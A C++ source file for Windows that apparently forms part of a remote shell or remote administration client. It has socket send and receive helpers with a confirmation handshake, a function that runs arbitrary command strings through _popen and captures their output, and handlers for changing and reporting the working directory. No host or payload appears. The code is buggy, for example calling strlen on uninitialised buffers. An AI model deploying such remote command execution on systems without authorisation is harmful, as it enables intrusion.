#include "../inc/other.h"
#include "../inc/common.h"

#include <iostream>
#include <stdio.h>
#include <string>
#include <windows.h>
#include <direct.h> //_chdir

string recvUltraSafe(int sock)
{   
    //https://forum.hardware.fr/hfr/Programmation/C-2/resolu-timeout-existe-sujet_34270_1.htm
    char buffer[BUFFER_LEN];
    timeval timeout;

    if(strlen(buffer) > 0)
    {
        //clean buffer
       // cout << "Clean " << endl;
        memset(buffer, 0, sizeof(buffer));
    }
    
    struct fd_set fds;

    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    
    timeout.tv_sec = TIMEOUT_SOCK;
    timeout.tv_usec = 0;

    int selectSock = select(0, &fds, 0, 0, &timeout);
    
    if(selectSock > 0)
    {
        //while (true)
        //Sleep(SLEEP_RECV);
        int len_recv= recv(sock, buffer, sizeof(buffer), 0);
        if(len_recv == SOCKET_ERROR)
        {
            cout << "Error socket error  ///" << endl;
            return (string) "ERROR";
        }
        else if (len_recv == 0)
        {
            //pass
            cout << "pass" << endl;
        }
    }
    else if (selectSock == 0)
    {
        //Timeout
        //cout << "TIMEOUT recv !!" << endl;
        //Stop
        return (string) "TIMEOUT";
    }

    int len_send = send(sock, "confirmation", strlen("confirmation"), 0);

    if(len_send == SOCKET_ERROR)
    {
        return (string) "SEND_ERROR";
    }
   
    if(strlen(buffer) == 0)
    {
        //empty buffer
        return ""; 
    }
    else
    {
        //cout << buffer << endl;
        return (string) buffer;    
    }
    
}

void sendUltraSafe(int sock, string data)
{
    int len_send=0;
    int len_recv=0;
    char buffer[BUFFER_LEN];
    string result;
    timeval timeout;


    if(strlen(buffer) > 0)
    {
        //clean buffer
        cout << "Clean buffer in sendUltrasafe " << endl;
        memset(buffer, 0, sizeof(buffer));
    }

    len_send = send(sock, data.c_str(), strlen(data.c_str()), 0);
    if(len_send == SOCKET_ERROR)
    {
        //error
        cout << "error " << endl;
    }
    else
    {   
        struct fd_set fds;

        FD_ZERO(&fds);
        FD_SET(sock, &fds);


        timeout.tv_sec = TIMEOUT_SOCK;
        timeout.tv_usec = 0;

        int selectSock = select(0, &fds, 0, 0, &timeout);
        if(selectSock > 0)
        {
            len_recv = recv(sock, buffer, sizeof(buffer), 0);
            result.append(buffer, len_recv);
            //cout << "buffer in sendultrasafe: " << result << endl;
            //cout << "Buffer len sendultrasafe: " << result.length() << "|"<< strlen("confirmation") << endl;

            if(result == "confirmation")
            {
                ;
                //cout << "confirmation ok ! in sendUltraSafe" << endl;
            }
            
            else
            {
                cout << "ERROR in sendUltraSafe confirmation: "  << endl;
            }
        }
        else if (selectSock == 0)
        {
            //timeout
            ;        
        }
    }
    
}

string exec(string command)
{
    command += " 2>&1"; //for catch stderr
    
    char buffer[1024];
    string result;

    FILE* pipe = _popen(command.c_str(), "rt");
    int fd_fp = _fileno(pipe);
    cout << "fd_f: " << fd_fp << endl;
    cout << "PIPE:" << pipe << endl;
    
    if (!pipe) 
    { 
        ///popen fail;
        cout << "POPEN FAILED" << endl;
        return ""; //Faiul
        //return "popen failed!";
    }
    // read till end of process:
    
    while (!feof(pipe)) 
    {   memset(buffer,0,sizeof(buffer));
        // use buffer to read and add to result
        if (fgets(buffer, sizeof(buffer), pipe) != NULL)
        {
            result.append(buffer,strlen(buffer));
        }
    }
    _pclose(pipe);
    
    return result;
    //cout << "Mod shell finish " << endl;
}

int changeDirectory(string path)
{
//    cout << path.substr(3,path.length()) << endl;
    if(_chdir((path.substr(3,path.length())).c_str())!=0)
    {
        return 1;
    }
    return 0;
}

string getPath()
{
    char* buffer;
   // Get the current working directory:
    if ( (buffer = _getcwd( NULL, 0 )) == NULL )
        ;
    string path = buffer;
    return path;
}

DWORD WINAPI popenThread(void *param)
{
    while (true)
    {
        cout <<" HELLO..." << endl;
        THREAD_POPEN* params =(THREAD_POPEN*)param;
        
  //      params->result = exec(params->command, params);
        
        cout << "FINISH " << endl;
        params->timeout = true;
        break;
    }
    return 0;
}
